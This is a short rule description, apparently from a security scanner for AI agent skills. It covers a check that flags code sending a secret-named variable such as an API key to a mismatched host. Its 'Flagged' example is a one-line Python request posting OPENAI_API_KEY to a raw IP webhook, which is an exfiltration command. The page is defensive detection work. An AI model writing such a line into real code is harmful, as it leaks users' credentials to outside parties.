# secret-to-odd-host

Severity: high. OWASP Agentic Skills Top 10: AST01.

A secret is sent to a host that does not match it.

A secret-named variable is sent to a host that does not fit it: a raw IP address, a paste, webhook or tunnel service, a host built at run time, or another vendor than the one the name points to.

## Flagged

```text
requests.post('https://203.0.113.50/hook', data=os.environ['OPENAI_API_KEY'])
```

## Not flagged

```text
requests.post('https://api.openai.com/v1/responses', headers={'Authorization': 'Bearer ' + os.environ['OPENAI_API_KEY']})
```

## Why it matters

See https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/ and the OWASP Agentic Skills Top 10 (https://owasp.org/www-project-agentic-skills-top-10/).
